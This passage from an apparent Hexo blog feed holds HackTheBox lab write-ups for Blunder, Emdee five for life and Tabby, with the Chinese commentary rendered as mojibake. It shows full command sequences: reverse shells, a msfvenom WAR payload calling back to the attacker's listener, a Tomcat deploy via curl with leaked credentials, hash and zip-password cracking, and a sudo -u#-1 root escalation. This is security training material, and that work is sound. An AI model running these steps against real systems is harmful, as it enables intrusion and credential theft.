class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3590 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ </span><br><span class="line"></span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd hugo</span><br><span class="line">cd hugo</span><br><span class="line">www-data@blunder:/home/hugo$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  user.txt</span><br><span class="line">Documents  Music      Public    Videos</span><br><span class="line">www-data@blunder:/home/hugo$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@blunder:/home/hugo$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd shaun</span><br><span class="line">cd shaun</span><br><span class="line">www-data@blunder:/home/shaun$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos</span><br><span class="line">www-data@blunder:/home/shaun$</span><br></pre></td></tr></table></figure><p><code>ä¸‹é¢æŸ¥æ‰¾bludité…ç½®æ–‡ä»¶ï¼Œå¯»æ‰¾ç”¨æˆ·hashå¯†ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/home/shaun$ cd /var/www/</span><br><span class="line">cd /var/www/</span><br><span class="line">www-data@blunder:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">bludit-3.10.0a  bludit-3.9.2  html</span><br><span class="line">www-data@blunder:/var/www$ cd bbludit-3.10.0a^[[D</span><br><span class="line">cd bbludit-3.10.0a</span><br><span class="line">bash: cd: bbludit-3.10.0a: No such file or directory</span><br><span class="line">www-data@blunder:/var/www$ cd bludit-3.10.0a</span><br><span class="line">cd bludit-3.10.0a</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE    bl-content  bl-languages  bl-themes  install.php</span><br><span class="line">README.md  bl-kernel   bl-plugins    index.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content</span><br><span class="line">cd bl-content</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls</span><br><span class="line">ls</span><br><span class="line">databases  pages  tmp  uploads  workspaces</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases</span><br><span class="line">cd databases</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls</span><br><span class="line">ls</span><br><span class="line">categories.php  plugins       site.php    tags.php</span><br><span class="line">pages.php       security.php  syslog.php  users.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php</span><br><span class="line">cat users.php</span><br><span class="line">&lt;?php defined(&#x27;BLUDIT&#x27;) or die(&#x27;Bludit CMS.&#x27;); ?&gt;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;admin&quot;: &#123;</span><br><span class="line">        &quot;nickname&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;firstName&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">        &quot;role&quot;: &quot;User&quot;,</span><br><span class="line">        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;&quot;,</span><br><span class="line">        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,</span><br><span class="line">        &quot;tokenRemember&quot;: &quot;&quot;,</span><br><span class="line">        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,</span><br><span class="line">        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,</span><br><span class="line">        &quot;twitter&quot;: &quot;&quot;,</span><br><span class="line">        &quot;facebook&quot;: &quot;&quot;,</span><br><span class="line">        &quot;instagram&quot;: &quot;&quot;,</span><br><span class="line">        &quot;codepen&quot;: &quot;&quot;,</span><br><span class="line">        &quot;linkedin&quot;: &quot;&quot;,</span><br><span class="line">        &quot;github&quot;: &quot;&quot;,</span><br><span class="line">        &quot;gitlab&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$`</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">è§£ç åœ°å€<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>hashå€¼ï¼šfaca404fd5c0a31cf1897b823c695c85cffeb98d</p><p>ç”¨æˆ·ï¼šHugo</p><p>è§£ç ï¼šPassword120</p></blockquote><h2 id="0x010-ææƒ"><a href="#0x010-ææƒ" class="headerlink" title="0x010.ææƒ"></a>0x010.ææƒ</h2><p><code>Hugoç™»å…¥</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ su hugo</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">hugo@blunder:/home$ whoami</span><br><span class="line">whoami</span><br><span class="line">hugo</span><br><span class="line">hugo@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">hugo@blunder:/home$ <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">hugo@blunder:~$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">hugo@blunder:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">hugo@blunder:~$ </span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨/bin/bashææƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line">hugo@blunder:~$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">root@blunder:/home/hugo<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@blunder:/home/hugo<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@blunder:/<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">bin    dev  home   lib64       media  proc  sbin  sys  var</span><br><span class="line">boot   etc  lib    libx32      mnt    root  snap  tmp</span><br><span class="line">cdrom  ftp  lib32  lost+found  opt    run   srv   usr</span><br><span class="line">root@blunder:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@blunder:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@blunder:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">*************************************</span><br><span class="line">root@blunder:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#0x01-æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¦‚è¿°&quot;&gt;&lt;/a&gt;0x01.æ¦‚è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/09/19/HTB-blunder/image-20200918203836239.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[Emdee_five_for_life]</title>
    <link href="https://lunamoore.github.io/2020/09/18/Emdee-five-for-life/"/>
    <id>https://lunamoore.github.io/2020/09/18/Emdee-five-for-life/</id>
    <published>2020-09-18T12:04:37.000Z</published>
    <updated>2020-09-19T00:08:30.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a><span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3">Emdee five for life<i class="fa fa-external-link-alt"></i></span></h2><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># cat ctf.py </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&quot;http://docker.hackthebox.eu:31569/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">out=r.get(url)</span><br><span class="line">outl=re.search(<span class="string">r&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\w*)&lt;/h3&gt;&quot;</span>,out.text)</span><br><span class="line">outll=hashlib.md5(outl.group(<span class="number">1</span>).encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&quot;sending md5 : &#123;&#125;&quot;</span>.format(outll))</span><br><span class="line">data=&#123;<span class="string">&#x27;hash&#x27;</span>:outll&#125;</span><br><span class="line">out=r.post(url=url,data=data)</span><br><span class="line">print(out.text)</span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># python3 ctf.py </span></span><br><span class="line">sending md5 : d92889d19659d8095201121281d6e98b</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;emdee five for life&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:powderblue;&quot;</span>&gt;</span><br><span class="line">&lt;h1 align=&#x27;center&#x27;&gt;MD5 encrypt this string&lt;/h1&gt;&lt;h3 align=&#x27;center&#x27;&gt;xcx4vl6glkWdxhQePelZ&lt;/h3&gt;&lt;p align=&#x27;center&#x27;&gt;HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;&lt;/p&gt;&lt;center&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;hash&quot; placeholder=&quot;MD5&quot; align=&#x27;center&#x27;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/form&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Emdee-five-for-life&quot;&gt;&lt;a href=&quot;#Emdee-five-for-life&quot; class=&quot;headerlink&quot; title=&quot;Emdee five for life&quot;&gt;&lt;/a&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3&quot;&gt;Emdee five for life&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[tabby]</title>
    <link href="https://lunamoore.github.io/2020/09/11/HTB-tabby/"/>
    <id>https://lunamoore.github.io/2020/09/11/HTB-tabby/</id>
    <published>2020-09-11T02:28:33.000Z</published>
    <updated>2020-09-11T02:44:59.983Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/11/HTB-tabby/image-20200909145742353.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹å¼€æ”¾äº†22/80/8080(tomcat)ç«¯å£</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nmap -sC -sV -sT 10.10.10.194 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 02:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.194</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Mega Hosting</span><br><span class="line">8080/tcp open  http    Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 67.64 seconds</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><p><code>å‘ç°æ˜¯ä¸€ä¸ªå–æœåŠ¡å™¨çš„</code></p><img src="/2020/09/11/HTB-tabby/image-20200909151511868.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°NEWé¡µé¢ä¸èƒ½è®¿é—®ï¼Œå¹¶è·³è½¬åˆ°äº†å¦‚ä¸‹é¡µé¢</code></p><img src="/2020/09/11/HTB-tabby/image-20200909151641647.png" class><p><code>æ·»åŠ ä¸€æ¡hostså†è®¿é—®ï¼Œæåˆ°äº†æ•°æ®æ³„éœ²ï¼Œå¹¶ä¸”æ„Ÿè§‰å­˜åœ¨æ–‡ä»¶åŒ…å«</code></p><blockquote><p>10.10.10.194    megahosting.htb</p></blockquote><img src="/2020/09/11/HTB-tabby/image-20200909162808330.png" class><p><code>æµ‹è¯•æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ç¡®å®å­˜åœ¨çš„</code></p><img src="/2020/09/11/HTB-tabby/image-20200909163047232.png" class><h2 id="0x03-è®¿é—®tomcat"><a href="#0x03-è®¿é—®tomcat" class="headerlink" title="0x03.è®¿é—®tomcat"></a>0x03.è®¿é—®tomcat</h2><h3 id="1-å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶"><a href="#1-å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶" class="headerlink" title="1.å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶"></a>1.å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶</h3><blockquote><p>/var/lib/tomcat9/webapps/ROOT/index.html</p><p>/usr/share/tomcat9</p><p>/var/lib/tomcat9</p><p>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</p><p>/etc/tomcat9/tomcat-users.xml</p></blockquote><img src="/2020/09/11/HTB-tabby/image-20200909170452209.png" class><h3 id="2-åŒ…å«æ•æ„Ÿæ–‡ä»¶"><a href="#2-åŒ…å«æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="2.åŒ…å«æ•æ„Ÿæ–‡ä»¶"></a>2.åŒ…å«æ•æ„Ÿæ–‡ä»¶</h3><p><code>ç™¾åº¦å‘ç°tomcat-users.xmlä¸ºç”¨æˆ·ç™»å½•é…ç½®æ–‡ä»¶</code></p><blockquote><p>ç»è¿‡ä¸æ‡ˆåŠªåŠ›å‘ç°æ–‡ä»¶ä½ç½®</p><p>/usr/share/tomcat9/etc/tomcat-users.xml</p></blockquote><p><code>æŸ¥çœ‹æºç å‘ç°ç”¨æˆ·å¯†ç </code></p><img src="/2020/09/11/HTB-tabby/image-20200909172907375.png" class><h2 id="0x04-æ„é€ exploit"><a href="#0x04-æ„é€ exploit" class="headerlink" title="0x04.æ„é€ exploit"></a>0x04.æ„é€ exploit</h2><p><span class="exturl" data-url="aHR0cHM6Ly90b21jYXQuYXBhY2hlLm9yZy90b21jYXQtNy4wLWRvYy9tYW5hZ2VyLWhvd3RvLmh0bWwjU3VwcG9ydGVkX01hbmFnZXJfQ29tbWFuZHM=">tomcatç›¸å…³å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/09/11/HTB-tabby/image-20200909180557612.png" class><p><code>ç”Ÿæˆexp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.17.216 lport=6666 -f war &gt; exp.war</span></span><br><span class="line">Payload size: 1086 bytes</span><br><span class="line">Final size of war file: 1086 bytes</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ exp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># curl --user &#x27;tomcat:$3cureP4s5w0rd123!&#x27; --upload-file exp.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/exp.war&quot;</span></span><br><span class="line">OK - Deployed application at context path [/exp.war]</span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>è®¿é—®http://10.10.10.194:8080/exp.waråå¼¹shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.194] 51532</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><p><code>å‡çº§shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>        </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$</span><br></pre></td></tr></table></figure><p><code>å‡çº§ä¸ºäº¤äº’shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/var/lib/tomcat9$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line"></span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><h2 id="0x05-å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯"><a href="#0x05-å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯" class="headerlink" title="0x05.å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯"></a>0x05.å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</h2><blockquote><p>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å‘ç°filesæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªbackup,zipæ–‡ä»¶ï¼ŒçŒœæµ‹ä¸ºå¤‡ä»½æ–‡ä»¶</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/var/www/html$ ls</span><br><span class="line">assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt</span><br><span class="line">tomcat@tabby:/var/www/html$ <span class="built_in">cd</span> files/</span><br><span class="line">tomcat@tabby:/var/www/html/files$ ls</span><br><span class="line">16162020_backup.zip  archive  revoked_certs  statement</span><br></pre></td></tr></table></figure><p><code>ä¸‹è½½backup.zipï¼Œå¹¶è§£å‹ï¼Œå‘ç°éœ€è¦å¯†ç </code></p><img src="/2020/09/11/HTB-tabby/image-20200909183155978.png" class><p><code>ä½¿ç”¨fcrackzipçˆ†ç ´è§£å‹å¯†ç ä¸ºadmin@it</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip </span></span><br><span class="line">possible pw found: admin@it ()</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>è§£å‹å¾—åˆ°äº†ä¸€ä¸ªwarç›®å½•ï¼Œä¹Ÿæ²¡å‘ç°å•¥ç©æ„</code></p><p><code>ä½†æ‹¿admin@itç™»å…¥ashå´æˆåŠŸäº†ã€‚ã€‚ã€‚ä»€ä¹ˆåŸç†~</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tomcat@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@tabby:/home$ </span><br><span class="line">ash@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">ash@tabby:/home$ <span class="built_in">cd</span></span><br><span class="line">ash@tabby:~$ ls</span><br><span class="line">alpine-v3.12-i686-20200909_0437.tar.gz    index.html  tmp</span><br><span class="line">alpine-v3.12-x86_64-20200909_1417.tar.gz  snap        user.txt</span><br><span class="line">ash@tabby:~$ cat user.txt </span><br><span class="line">*************************************</span><br><span class="line">ash@tabby:~$</span><br></pre></td></tr></table></figure><h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhZ2h1bC9seGQtYWxwaW5lLWJ1aWxkZXI=">æœ¬æ¬¡ä½¿ç”¨lxd<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" 